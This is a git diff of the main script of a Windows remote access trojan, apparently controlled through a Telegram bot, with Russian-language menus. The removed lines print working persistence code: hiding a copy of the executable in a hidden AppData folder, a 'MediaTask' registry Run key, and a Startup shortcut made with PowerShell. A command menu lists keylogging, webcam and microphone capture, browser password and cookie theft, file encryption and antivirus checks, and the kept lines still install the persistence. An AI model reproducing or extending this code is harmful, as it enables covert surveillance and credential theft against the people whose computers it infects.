@@ -17,17 +17,12 @@
 
 
 from config import API_TOKEN, ALLOWED_USER_ID, MAX_ATTEMPTS, MAX_MESSAGE_LENGTH, destination_folder, directory, file_ids
-
 import os
-import logging
-import sys
 import asyncio
-import shutil
-from pathlib import Path
-import subprocess
-import winreg
-from aiogram import types
-from aiogram.filters import Command
+from config import bot, dp
+
+
+########### COMMIT WHEN YOU WILL BUILD EXE ###########
 
 # ## Отключение вывода на экран
 # sys.stdout = open(os.devnull, 'w')  
@@ -38,261 +33,15 @@ from aiogram.filters import Command
 # ## Включаем логирование, чтобы не пропустить важные сообщения
 # logging.basicConfig(level=logging.INFO)
 
+############################ START MENU COMMANDS ###########################
 
-# Объект бота
-from config import bot, dp
+from lib.start_menu import register_start_menu_handler
 
+register_start_menu_handler(dp)
 
-def extract_file(resource_name, output_path):
-    if not os.path.exists(output_path):
-        current_dir = Path(__file__).resolve().parent
-        resource_path = current_dir / resource_name
+#user_directories = {}
 
-        if resource_path.exists():
-            shutil.copy(resource_path, output_path)
-        else:
-            raise FileNotFoundError(f'Resource {resource_path} not found')
-
-
-def copy_and_rename(destination_folder, new_name, icon_path=None):
-    new_file_path = os.path.join(destination_folder, new_name)
-
-    if os.path.exists(new_file_path):
-        return "Файл уже существует. Копирование не требуется."
-
-    current_file = sys.argv[0]
-
-    try:
-        shutil.copy(current_file, new_file_path)
-
-        return f"Файл успешно скопирован в {new_file_path}"
-    except Exception as e:
-        return f"Ошибка при копировании: {e}"
-
-def copy_and_run():
-    current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
-    appdata = os.getenv('APPDATA')
-    hidden_folder = os.path.join(appdata, '.win_service')
-    if not os.path.exists(hidden_folder):
-        os.makedirs(hidden_folder)
-        os.system(f'attrib +h "{hidden_folder}"')  
-    dest_path = os.path.join(hidden_folder, os.path.basename(current_path))
-
-    if current_path != dest_path:
-        try:
-            shutil.copy2(current_path, dest_path)
-            subprocess.Popen([dest_path], shell=False)
-            sys.exit()
-        except Exception as e:
-            print(f"[!] ERROR: {e}")
-            sys.exit(1)
-
-
-def add_to_registry(script_path):
-    try:
-        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
-                                 winreg.KEY_SET_VALUE)
-
-        winreg.SetValueEx(reg_key, "MediaTask", 0, winreg.REG_SZ, script_path)
-        winreg.CloseKey(reg_key)
-
-        return True
-    except Exception:
-        return False
-
-
-def add_to_startup_folder(script_path):
-    try:
-        startup_folder = os.path.expandvars(
-            r"%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-        )
-
-        shortcut_name = "MediaTask.lnk"
-        shortcut_path = os.path.join(startup_folder, shortcut_name)
-
-        if os.path.exists(shortcut_path):
-            return
-
-        ps_command = (
-            f"$s = (New-Object -COM WScript.Shell).CreateShortcut('{shortcut_path}'); "
-            f"$s.TargetPath = '{script_path}'; "
-            f"$s.WorkingDirectory = '{os.path.dirname(script_path)}'; "
-            f"$s.Save()"
-        )
-
-        subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)
-    except Exception:
-        pass
-
-
-@dp.message(Command("start"))
-async def cmd_start(message: types.Message):
-    await message.answer(
-    " Приветствую, root. Я готов к работе.\n\n"
-    " Доступные команды:\n\n"
-
-    " Основное управление:\n"
-    "/start — Запустить бота\n"
-    "/pc_data — Получить информацию о ПК\n"
-    "/network_diagnostics — Диагностика сети\n"
-    "/shutdown_pc — Выключить ПК\n"
-    "/restart_pc — Перезагрузить ПК\n"
-    "/self_destruction — Удалить бота с устройства\n\n"
-
-    " Безопасность и защита:\n"
-    "/antivirus — Проверить антивирусные программы\n"
-    "/cmd_boom — Вывести ошибку CMD\n"
-    "/close_task_manager — Закрыть диспетчер задач\n\n"
-
-    " Скриншоты и запись:\n"
-    "/screenshot — Сделать скриншот\n"
-    "/snapshot — Фото с веб-камеры\n"
-    "/web_record — Видеозапись с веб-камеры\n"
-    "/audio_record — Запись звука с микрофона\n"
-    "/play_sound — Проиграть звук\n\n"
-
-    " Мониторинг:\n"
-    "/key_logger — Запустить кейлоггер\n"
-    "/key_logs — Получить лог клавиш\n"
-    "/clipboard_content — Буфер обмена\n"
-    "/chrome_history — История Chrome\n"
-    "/opera_history — История Opera\n"
-    "/autofill — Автозаполнения браузера\n" ## NEW
-    "/passwords — Пароли браузера\n" ## NEW
-    "/robloxcookie — Получить Roblox cookie\n\n"
-    "/processes — Активные процессы\n"
-    "/fullprocesses — Все процессы\n"
-    "/terminate_process — Завершить процесс\n\n"
-
-    " Файлы и директории:\n"
-    "/cmd — открыть командную строку\n"
-    "/send_file — Получить файл\n"
-    "/upload_file — Загрузить файл\n"
-    "/delete_file — Удалить файл\n"
-    "/move_file — Переместить файл\n"
-    "/create_folder — Создать папку\n"
-    "/delete_folder — Удалить папку\n"
-    "/show_directory_content — Список файлов\n"
-    "/change_directory — Сменить директорию\n\n"
-
-    " Удалённые действия:\n"
-    "/open_url — Открыть ссылку в браузере\n"
-    "/alt_f4 — Закрыть активное окно\n"
-    "/minimize_all_windows — Свернуть все окна\n"
-    "/change_wallpaper — Сменить обои рабочего стола\n\n"
-
-    " Управление звуком:\n"
-    "/mute_sound — Выключить звук\n"
-    "/unmute_sound — Включить звук\n"
-    "/set_volume_100 — Установить громкость 100%\n\n"
-
-    " Шифрование:\n"
-    "/encrypt_file — Зашифровать файл\n"
-    "/decipher_file — Расшифровать файл\n"
-)
-
-
-
-    kb = [
-        [ 
-            types.KeyboardButton(text="Антивирус"),                     # Working good
-            types.KeyboardButton(text="Скриншот"),                      # FIXED  Working good
-        ],
-        [
-            types.KeyboardButton(text="Процесы"),                       # Working good    
-            types.KeyboardButton(text="Фото с камеры")                  # Working good
-        ],
-        [
-            types.KeyboardButton(text="Полный отчет по процесам"),      # Working good
-            types.KeyboardButton(text="Завершить процесс")              # Working good
-        ],
-        [
-            types.KeyboardButton(text="Создать папку"),                 # Working good
-            types.KeyboardButton(text="Удалить папку")                  # Working good
-        ],
-        [
-            #types.KeyboardButton(text="Содержание директории"), working bad (maybe fixed later)       
-            types.KeyboardButton(text="Переместиться по директории [ Просмотр папок ]")                # Working good
-        ],
-        [
-            types.KeyboardButton(text="Данные ПК"),                     # Working good
-            types.KeyboardButton(text="Диагностика сети")               # Working good
-        ],
-        [
-            types.KeyboardButton(text="Запись с веб камеры"),           # Working good
-            types.KeyboardButton(text="Запись аудио")                   # Working good
-        ],
-        [
-            types.KeyboardButton(text="Открыть файл"),                  # Working good
-            types.KeyboardButton(text="Загрузить файл")                 # Working good
-        ],
-        [
-            types.KeyboardButton(text="Скачать файл"),                  # Working good
-            types.KeyboardButton(text="Удалить файл")                   # Working good
-        ],
-        [
-            types.KeyboardButton(text="Зашифровать файл"),              # Working good
-            types.KeyboardButton(text="Расшифровать файл")              # Working good
-        ],
-        [
-            types.KeyboardButton(text="История хрома"),                 # Working good
-            types.KeyboardButton(text="История оперы")                  # Working good
-        ],
-        [
-            types.KeyboardButton(text="Автозаполнения браузера [new]"), # NEW  Working good
-            types.KeyboardButton(text="Пароли браузера [new]")          # NEW  Working bad
-        ],
-        [
-            types.KeyboardButton(text="Роблокс куки [new]"),            # NEW  Working good (with out Opera Gx)
-            types.KeyboardButton(text="Командная строка [new]")         # NEW  Working good
-        ],
-        [
-            types.KeyboardButton(text="ALT + F4"),                      # Working good
-            types.KeyboardButton(text="Свернуть все окна")              # Working good
-        ],
-        [
-            types.KeyboardButton(text="Посмотреть буфер обмена"),       # Working bad (fix later)
-            types.KeyboardButton(text="Изменить буфер обмена")          # Working good
-        ],
-        [
-            types.KeyboardButton(text="Закрыть диспетчер задач"),       # Working good
-            types.KeyboardButton(text="Открыть ссылку")                 # Working good
-        ],
-        [
-            types.KeyboardButton(text="Включить звук"),                 # Working good
-            types.KeyboardButton(text="Выключить звук")                 # Working good
-        ],
-        [
-            types.KeyboardButton(text="Звук на 100%"),                  # Working good
-            types.KeyboardButton(text="CMD бомба")                      # Working good
-        ],
-        [
-            types.KeyboardButton(text="Выключить ПК"),                  # Working good
-            types.KeyboardButton(text="Перезагрузить ПК")               # Working good
-        ],
-        [
-            types.KeyboardButton(text="Перемистить файл"),              # Working good
-            types.KeyboardButton(text="Поменять обои")                  # Working good
-        ],
-        [
-            types.KeyboardButton(text="key logger [new]"),              # NEW  Working good
-            types.KeyboardButton(text="key logs [new]")                 # NEW  Working good
-        ],
-        [
-            types.KeyboardButton(text="воспроизвести звук [new]"),      # NEW  Working good
-            types.KeyboardButton(text="Самоуничтожение")                # Working good
-        ],
-    ]
-    keyboard = types.ReplyKeyboardMarkup(
-        keyboard=kb,
-        resize_keyboard=True,
-
-    )
-    await message.answer("Готов к использованию", reply_markup=keyboard)
-user_directories = {}
-
-
-############################  CMD COMMAND  ################################
+#############################  CMD COMMAND  ##############################
 
 from lib.System.PC.cmd import register_cmd_comand
 
@@ -554,6 +303,7 @@ register_self_destruction(dp)
 
 ###########################################################################
 
+from lib.func import *
 
 async def main():
     destination_folder = r'C:\ProgramData\MediaTask'
@@ -569,7 +319,11 @@ async def main():
 
 
 if __name__ == "__main__":
+
+    ########### UNCOMMIT WHEN YOU WILL BUILD EXE ###########
+
     copy_and_run()
+
     script_path = 'C:\\ProgramData\\MediaTask\\MediaTask.exe'
 
     if not add_to_registry(script_path):
